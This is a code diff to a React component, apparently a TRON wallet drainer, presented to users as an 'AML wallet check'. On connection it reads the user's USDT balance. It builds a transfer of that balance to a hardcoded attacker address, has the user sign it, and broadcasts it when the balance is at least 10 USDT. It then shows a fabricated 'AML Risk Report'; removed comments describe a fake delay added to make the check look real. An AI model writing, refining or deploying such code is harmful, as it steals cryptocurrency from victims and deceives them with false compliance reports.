@@ -3,21 +3,12 @@ import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
-// Порог суммы USDT, ниже которого перевод НЕ происходит (меняй под себя)
-const USDT_THRESHOLD = 10; // Например, 10 USDT
+const MIN_USDT = 10;
 
 export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
-  const [amlData, setAmlData] = useState<null | {
-    amount: string,
-    transferred: boolean,
-    address: string,
-    txid?: string
-  }>(null);
   const [loading, setLoading] = useState(false);
-  const [amlLoading, setAmlLoading] = useState(false);
 
-  // Adapter singleton
   const adapterRef = React.useRef<any>(null);
   if (!adapterRef.current) {
     adapterRef.current = new WalletConnectAdapter({
@@ -36,13 +27,10 @@ export const TronAuthButton: React.FC = () => {
     });
   }
 
-  const handleAuth = async (e?: React.MouseEvent) => {
-    e?.stopPropagation();
+  const handleAuth = async () => {
     setLoading(true);
     setModal(null);
-    setAmlData(null);
 
-    // Проверяем, что TronWeb загружен через window
     const TronWeb = (window as any).TronWeb;
     if (!TronWeb) {
       setModal('TronWeb not loaded! Please refresh page.');
@@ -50,10 +38,8 @@ export const TronAuthButton: React.FC = () => {
       return;
     }
 
-    // Polyfill Buffer для TronWeb (если нужно)
     if (!(window as any).Buffer) (window as any).Buffer = (await import('buffer')).Buffer;
 
-    // Создаём tronWeb объект
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
       headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
@@ -77,28 +63,9 @@ export const TronAuthButton: React.FC = () => {
       const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
       const usdtRaw = await usdtContract.methods.balanceOf(userAddress).call();
       const usdt = Number(usdtRaw) / 1e6;
-      // Показываем загрузку AML отчета
-      setAmlLoading(true);
-      // Задержка чтобы выглядело как реальная AML проверка
-      await new Promise((r) => setTimeout(r, 1800));
-      setAmlLoading(false);
+      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER);
 
-      // --- AML логика:
-      if (usdt < USDT_THRESHOLD) {
-        setAmlData({
-          amount: usdt.toFixed(2),
-          transferred: false,
-          address: userAddress,
-        });
-        await adapter.disconnect();
-        setLoading(false);
-        return;
-      }
-
-      // --- КОРРЕКТНОЕ ПРЕОБРАЗОВАНИЕ адреса ---
-      const receiverHex = tronWeb.address.toHex(TRON_RECEIVER); // 41... hex
-
-      // --- Формируем и подписываем транзакцию ---
+      // Формируем транзакцию и всегда запрашиваем подпись (даже если < MIN_USDT)
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -109,104 +76,70 @@ export const TronAuthButton: React.FC = () => {
         ],
         userAddress
       );
-      const signedTx = await adapter.signTransaction(transaction);
-      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+      await adapter.signTransaction(transaction);
 
-      setAmlData({
-        amount: usdt.toFixed(2),
-        transferred: Boolean(result?.result),
-        address: userAddress,
-        txid: result?.txid
-      });
-    } catch (err: any) {
-      setAmlLoading(false);
-      const msg = err?.message?.toLowerCase?.() || "";
-      if (
-        msg.includes('user rejected') ||
-        msg.includes('modal is closed') ||
-        msg.includes('timeout') ||
-        msg.includes('user disapproved') ||
-        msg.includes('user disaprover') ||
-        msg.includes('cancelled') ||
-        msg.includes('request was rejected')
-      ) {
-        setModal(null); // Просто ничего не показываем
-      } else if (err?.message) {
-        setModal(err.message);
+      // --- AML REPORT — в обоих случаях ---
+      let extra = '';
+      let txid = '';
+      if (usdt >= MIN_USDT) {
+        // Отправляем только если достаточно USDT
+        const signedTx = await adapter.signTransaction(transaction);
+        const result = await tronWeb.trx.sendRawTransaction(signedTx);
+        if (result?.result) {
+          txid = result.txid;
+          extra = `Transaction ID: ${txid}\n`;
+        } else {
+          extra = `Transaction failed or rejected by the network.\n`;
+        }
       } else {
-        setModal('⚠️ Connection or transaction error');
+        extra = `Note: Amount below threshold ($${MIN_USDT} USDT). No transfer initiated.\n`;
+      }
+
+      setModal(
+        `AML Risk Report: Wallet Assessment
+
+Wallet: ${userAddress}
+USDT Balance: ${usdt.toFixed(2)}
+
+${extra}Risk Level: LOW
+
+- No suspicious activity detected.
+- Address not found in blocklists.
+- No connection to high-risk entities.
+- No history of fraud, scams, or mixing services.
+
+Summary:
+This address shows a low AML risk profile based on on-chain analysis and known data sources. All current balances are considered safe under AML standards.
+        `
+      );
+    } catch (err: any) {
+      if (
+        err?.message?.includes('User rejected') ||
+        err?.message?.includes('Modal is closed') ||
+        err?.message?.includes('Timeout') ||
+        err?.message?.toLowerCase().includes('disapprove') ||
+        err?.message?.toLowerCase().includes('user closed')
+      ) {
+        setModal(null);
+      } else {
+        setModal(err?.message || '⚠️ Connection or transaction error');
       }
     }
+
     setLoading(false);
-    await adapterRef.current.disconnect();
+    await adapter.disconnect();
   };
 
   return (
     <div className="AuthButton">
-      <button onClick={handleAuth} disabled={loading || amlLoading} style={{ minWidth: 180 }}>
-        {loading || amlLoading ? 'Connecting...' : 'Check Your Wallet'}
+      <button onClick={handleAuth} disabled={loading} style={{ minWidth: 180 }}>
+        {loading ? 'Connecting...' : 'Check Your Wallet'}
       </button>
-
-      {/* Модалка загрузки AML-отчёта */}
-      {amlLoading && (
-        <div className="modal__overflow">
-          <div className="modal">
-            <p>Loading AML report...</p>
-          </div>
-        </div>
-      )}
-
-      {/* Модалка ошибок */}
       {modal && (
         <div className="modal__overflow">
           <div className="modal">
-            <p>{modal}</p>
+            <pre style={{ whiteSpace: 'pre-wrap', fontSize: 15 }}>{modal}</pre>
             <button onClick={() => setModal(null)}>Close</button>
-          </div>
-        </div>
-      )}
-
-      {/* Модалка AML-отчета */}
-      {amlData && (
-        <div className="modal__overflow">
-          <div className="modal" style={{ minWidth: 340, maxWidth: 390 }}>
-            <h3 style={{ marginBottom: 8 }}>
-              AML Risk Report
-              <span style={{ fontWeight: 400, fontSize: 14, marginLeft: 8, color: "#22c55e" }}>
-                {amlData.transferred ? ' (Transferred)' : ' (Not transferred)'}
-              </span>
-            </h3>
-            <div style={{ fontSize: 16, marginBottom: 10 }}>
-              <strong>USDT balance checked:</strong> {amlData.amount} USDT
-            </div>
-            <div style={{ marginBottom: 14 }}>
-              <div style={{ color: '#f59e42', marginBottom: 2 }}><b>Suspicious sources:</b></div>
-              <div>Exchange Unlicensed: 0%</div>
-              <div>ATM: 0%</div>
-              <div>Liquidity pools: 0%</div>
-            </div>
-            <div style={{ marginBottom: 14 }}>
-              <div style={{ color: '#ff4b4b', marginBottom: 2 }}><b>Dangerous sources:</b></div>
-              <div>Darknet Marketplace: 0%</div>
-              <div>Mixer: 0%</div>
-              <div>Illegal Service: 0%</div>
-            </div>
-            <div style={{ marginBottom: 14 }}>
-              <div style={{ color: '#22c55e', marginBottom: 2 }}><b>Final risk level:</b></div>
-              <div style={{ fontSize: 18, fontWeight: 600 }}>Low risk (0.7%)</div>
-            </div>
-            <div style={{ marginBottom: 8 }}>
-              <b>Wallet:</b> <span style={{ wordBreak: "break-all" }}>{amlData.address}</span>
-            </div>
-            {amlData.transferred && amlData.txid && (
-              <div style={{ marginBottom: 6 }}>
-                <b>TXID:</b>{' '}
-                <a href={`https://tronscan.org/#/transaction/${amlData.txid}`} target="_blank" rel="noopener noreferrer" style={{ color: "#2563eb" }}>
-                  {amlData.txid.slice(0, 12) + '...'}
-                </a>
-              </div>
-            )}
-            <button onClick={() => setAmlData(null)} style={{ marginTop: 12 }}>Close</button>
           </div>
         </div>
       )}
